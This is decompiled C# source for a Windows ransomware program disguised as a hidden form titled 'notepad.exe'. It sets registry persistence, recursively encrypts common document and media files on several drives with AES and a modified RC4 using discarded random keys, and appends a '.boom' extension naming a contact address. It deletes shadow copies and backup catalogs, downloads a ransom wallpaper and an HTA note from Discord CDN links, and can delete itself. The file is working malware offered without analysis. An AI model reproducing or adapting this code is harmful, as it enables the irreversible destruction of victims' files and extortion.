using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace B221;

public class Form1 : Form
{
	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	private IContainer components = null;

	private CheckBox chkUpdateRegistry;

	private TextBox d654654;

	public Form1()
	{
		InitializeComponent();
	}

	private byte[] customAes(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 9, 7, 6, 5, 4, 3, 2, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static byte[] CustomRC4(byte[] bytes, byte[] key)
	{
		byte[] array = new byte[bytes.Length];
		byte[] array2 = new byte[2048];
		byte[] array3 = new byte[2048];
		int i;
		for (i = 0; i < 2048; i++)
		{
			array2[i] = (byte)i;
			array3[i] = key[i % key.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 2048; i++)
		{
			num = (num + array2[i] + array3[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < array.GetLength(0); j++)
		{
			i = (i + 1) % 2048;
			num = (num + array2[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 2048;
			array[j] = (byte)(bytes[j] ^ array2[num2]);
		}
		return array;
	}

	public string passgen(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void fileEncryption(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = customAes(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file);
	}

	public void fileEncryptionrc4(string file, string password)
	{
		byte[] bytes = File.ReadAllBytes(file);
		byte[] bytes2 = Encoding.UTF8.GetBytes(password);
		bytes2 = SHA256.Create().ComputeHash(bytes2);
		byte[] bytes3 = CustomRC4(bytes, bytes2);
		File.WriteAllBytes(file, bytes3);
		genExt();
		File.Move(file, file + ".[neftet@tutanota.com].boom");
	}

	private string genExt()
	{
		string text = passgen(12);
		return text.ToString();
	}

	private void persistence()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("rundll.exe", Application.get_ExecutablePath().ToString());
	}

	public void MainEncryption(string dest, string key)
	{
		try
		{
			string[] source = new string[41]
			{
				".txt", ".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".lnk",
				".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb",
				".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bk", ".bat", ".mp3",
				".mp4", ".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv", ".mov", ".ogg",
				".rtf"
			};
			string[] files = Directory.GetFiles(dest);
			string[] directories = Directory.GetDirectories(dest);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					fileEncryption(files[i], key);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				MainEncryption(directories[j], key);
			}
		}
		catch (Exception)
		{
		}
	}

	public void rc4dir(string dest, string key)
	{
		try
		{
			string[] source = new string[43]
			{
				".txt", ".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".lnk",
				".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb",
				".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".ml", ".xml", ".psd", ".bk",
				".bat", ".mp3", ".mp4", ".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv",
				".mov", ".ogg", ".rtf"
			};
			string[] files = Directory.GetFiles(dest);
			string[] directories = Directory.GetDirectories(dest);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					fileEncryptionrc4(files[i], key);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				rc4dir(directories[j], key);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void clearmem()
	{
		Process currentProcess = Process.GetCurrentProcess();
		try
		{
			currentProcess.MinWorkingSet = (IntPtr)300000;
		}
		catch (Exception)
		{
			throw new Exception();
		}
	}

	private void encryptionStage()
	{
		string key = passgen(32);
		string key2 = passgen(256);
		MainEncryption("C:\\", key);
		MainEncryption("D:\\", key);
		MainEncryption("E:\\", key);
		MainEncryption("F:\\", key);
		MainEncryption("G:\\", key);
		MainEncryption("Z:\\", key);
		MainEncryption("A:\\", key);
		key = null;
		rc4dir("C:\\", key2);
		rc4dir("D:\\", key2);
		rc4dir("E:\\", key2);
		rc4dir("F:\\", key2);
		rc4dir("G:\\", key2);
		rc4dir("Z:\\", key2);
		rc4dir("A:\\", key2);
		key2 = null;
		clearmem();
	}

	public void x3()
	{
		deleteRecovery();
		Thread.Sleep(1200);
		deleteRecovery();
		Thread.Sleep(1200);
		deleteRecovery();
	}

	public void deleteRecovery()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.Arguments = "/C vssadmin.exe delete shadows /all /quiet";
			process.StartInfo = processStartInfo;
			process.Start();
			Process process2 = new Process();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.FileName = "cmd.exe";
			processStartInfo2.Arguments = "/C wmic shadowcopy delete";
			process2.StartInfo = processStartInfo2;
			process2.Start();
			Process process3 = new Process();
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.FileName = "cmd.exe";
			processStartInfo3.Arguments = "/C wbadmin delete catalog -quiet";
			process3.StartInfo = processStartInfo3;
			process3.Start();
		}
		catch (Exception)
		{
		}
	}

	private static byte[] distDownload(string url)
	{
		while (true)
		{
			try
			{
				using WebClient webClient = new WebClient();
				return webClient.DownloadData(url);
			}
			catch
			{
				Thread.Sleep(5000);
			}
		}
	}

	private void wallpap()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/599226424695455755/800087465523675176/65QEF.bmp"), Application.get_StartupPath() + "\\65QEF.bmp");
		((Control)d654654).set_Text(Application.get_StartupPath() + "\\65QEF.bmp");
		Thread.Sleep(1200);
		wlpp(((Control)d654654).get_Text(), chkUpdateRegistry.get_Checked());
	}

	private void extract()
	{
		byte[] payloadBuffer = distDownload("https://cdn.discordapp.com/attachments/599226424695455755/798932401216552974/READ_ME.hta");
		if (!File.Exists(Environment.SpecialFolder.Startup.ToString() + "\\READ_ME.hta"))
		{
			persist(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\READ_ME.hta", payloadBuffer);
		}
		if (!File.Exists(Environment.SpecialFolder.Desktop.ToString() + "\\READ_ME.hta"))
		{
			install(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_ME.hta", payloadBuffer);
		}
	}

	private void payload()
	{
		persistence();
		encryptionStage();
		wallpap();
		extract();
		x3();
		clearmem();
		Application.Exit();
	}

	private static bool install(string dropPath, byte[] payloadBuffer)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
				fileStream.Write(payloadBuffer, 0, payloadBuffer.Length);
				fileStream.Dispose();
				Process.Start(dropPath);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static bool persist(string dropPath, byte[] payloadBuffer)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
				fileStream.Write(payloadBuffer, 0, payloadBuffer.Length);
				fileStream.Dispose();
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static void GoodBye()
	{
		ProcessStartInfo startInfo = null;
		try
		{
			startInfo = new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			};
		}
		catch
		{
		}
		finally
		{
			Process.Start(startInfo);
			Environment.Exit(0);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		payload();
		clearmem();
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	private void wlpp(string file_name, bool update_registry)
	{
		try
		{
			uint fWinIni = 0u;
			if (update_registry)
			{
				fWinIni = 3u;
			}
			if (!SystemParametersInfo(20u, 0u, file_name, fWinIni))
			{
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		chkUpdateRegistry = new CheckBox();
		d654654 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)chkUpdateRegistry).set_AutoSize(true);
		((Control)chkUpdateRegistry).set_Location(new Point(12, 12));
		((Control)chkUpdateRegistry).set_Name("chkUpdateRegistry");
		((Control)chkUpdateRegistry).set_Size(new Size(98, 17));
		((Control)chkUpdateRegistry).set_TabIndex(0);
		((Control)chkUpdateRegistry).set_Text("984654654654");
		((ButtonBase)chkUpdateRegistry).set_UseVisualStyleBackColor(true);
		((Control)d654654).set_Location(new Point(12, 40));
		((Control)d654654).set_Name("d654654");
		((Control)d654654).set_Size(new Size(199, 20));
		((Control)d654654).set_TabIndex(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(223, 72));
		((Control)this).get_Controls().Add((Control)(object)d654654);
		((Control)this).get_Controls().Add((Control)(object)chkUpdateRegistry);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("notepad.exe");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
